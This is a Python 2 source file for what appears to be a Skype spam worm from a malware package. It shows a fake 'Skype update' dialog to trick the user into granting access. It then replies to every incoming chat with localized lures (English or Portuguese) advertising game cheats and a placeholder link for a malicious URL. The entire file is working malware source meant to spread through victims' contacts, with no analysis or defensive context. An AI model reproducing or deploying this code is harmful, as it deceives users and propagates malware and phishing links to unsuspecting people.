#! python2
# skype_bot - (bad_blocks package)

"""             _____        .__    ________
  ___________  /  |  |  _____|  |__ \_____  \______
_/ ___\_  __ \/   |  |_/  ___/  |  \  _(__  <_  __ \
\  \___|  | \/    ^   /\___ \|   Y  \/       \  | \/
 \___  >__|  \____   |/____  >___|  /______  /__|
     \/           |__|     \/     \/       \/       """

import Skype4Py, random, locale, ctypes

urls = random.choice(['a','b'])
windll = ctypes.windll.kernel32
lan = locale.windows_locale[windll.GetUserDefaultUILanguage()]
distr = random.choice(['cs', 'rust', 'pb', 'minecraft','lol', 'wow', 'crossfire', 'combat_arms', 'dota'])

if lan == 'pt_BR':
    message0 = random.choice(['Olha so o que eu achei kkkk| ', 'Voce nao vai acreditar nisso| ', 'Viu o novo lancamento?| '])
    message1 = message0 + 'Hacks de' + distr + ": YOUR URL GOES HERE"
    ctypes.windll.user32.MessageBoxA(0, "Nova atualizacao Skype! Aceite o plugin para baixa-la!", "Skype", 1)

else:
    message0 = random.choice(['Take a look at what I have just found! LOLOLOL| ', 'Unbelievable!!| ', 'Have you seen the news?| '])
    message1 = message0 + distr + " cheats: YOUR URL GOES HERE"
    ctypes.windll.user32.MessageBoxA(0, "New Skype update! Accept the plugin to download it!", "Skype", 1)

skype = Skype4Py.Skype()

def send(Message):
    final = message1
    Message.Chat.SendMessage(final)

def Commands(Message, Status):
    if Status == 'RECEIVED':
        send(Message)

skype.Attach()
skype.OnMessageStatus = Commands
while True:
    pass
